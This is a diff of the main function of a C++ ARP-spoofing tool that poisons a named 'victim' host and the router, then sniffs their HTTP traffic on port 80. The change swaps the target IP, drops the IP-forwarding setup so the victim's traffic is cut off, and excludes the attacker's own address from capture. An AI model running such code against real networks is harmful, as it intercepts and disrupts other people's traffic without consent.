@@ -74,15 +74,11 @@ int main() {
 	string iface = "wlan0";
 
 	/* Host A IP address */
-	string victim_net = "192.168.0.106";
+	string victim_net = "192.168.0.112";
 	/* HOst B IP address */
 	string router = "192.168.0.1";
 
 	/* ----------------------------------------------------------------------- */
-
-	/* Set IP forward */
-	set_ipforward();
-
 	/*
 	 * Begin the ARP poisoning (Sending false ARP requests)
 	 */
@@ -98,7 +94,7 @@ int main() {
 	/* ----------------------------------------------------------------------- */
 
 	/* Create a sniffer */
-	Sniffer sniff("ip and tcp and port 80",iface,PacketHandler);
+	Sniffer sniff("ip and tcp and port 80 and not host " + GetMyIP(iface),iface,PacketHandler);
 
 	/* Set the global reference */
 	global_sniff = &sniff;
@@ -108,11 +104,6 @@ int main() {
 
 	/* And capture ad-infinitum (until CTRL-C is pressed) */
 	sniff.Capture(-1);
-
-	/* ----------------------------------------------------------------------- */
-
-	/* Reset IP forward */
-	reset_ipforward();
 
 	cout << "[@] Main done. " << endl;
 
